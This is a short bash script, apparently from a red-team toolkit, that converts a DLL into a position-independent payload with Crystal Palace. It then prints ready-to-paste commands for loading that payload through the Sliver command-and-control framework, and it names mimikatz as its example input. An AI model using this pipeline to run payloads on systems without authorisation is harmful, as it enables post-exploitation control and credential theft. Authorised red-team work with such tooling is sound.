#!/usr/bin/env bash
#
# postex.sh — one-shot post-ex wrapper: DLL → PICO → ready-to-paste Sliver command
#
# Usage:
#   ./postex.sh <dll> [args-string]
#
#   Wraps the DLL through Crystal Palace into a named PICO, then prints the
#   ready-to-paste Sliver command. PICO is named after the input DLL
#   (e.g. mimikatz.dll → build/mimikatz.pico.bin).
#
#   If args-string is given it is baked into the PICO at link time.
#   For runtime-dynamic args (no rebuild needed), use args= directly in Sliver.
#
# Required: CRYSTAL_PALACE_HOME in env OR set in sliver-glue/.crystalenv

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -f "$SCRIPT_DIR/.crystalenv" ]] && source "$SCRIPT_DIR/.crystalenv"

INPUT_DLL="${1:?Usage: postex.sh <dll> [args-string]}"
ARGS_INPUT="${2:-}"

BASENAME="$(basename "$INPUT_DLL" .dll)"
OUTPUT="$SCRIPT_DIR/build/${BASENAME}.pico.bin"

"$SCRIPT_DIR/generate.sh" "$INPUT_DLL" "$ARGS_INPUT" "$OUTPUT"

echo ""
echo "══════════════════════════════════════════════════════════"
echo "[+] PICO: $OUTPUT"
echo ""
echo "    Paste into sliver-client:"
echo "    crystal payload=$OUTPUT"
echo ""
echo "    With runtime args (overrides baked args, no rebuild):"
echo "    crystal payload=$OUTPUT args=\"<command string>\""
echo ""

TARBALL="$SCRIPT_DIR/build/crystal-loader-0.1.0.tar.gz"
if [[ -f "$TARBALL" ]]; then
    echo "    One-time extension install (skip if already loaded):"
    echo "    extensions install $TARBALL"
    echo ""
fi
echo "══════════════════════════════════════════════════════════"
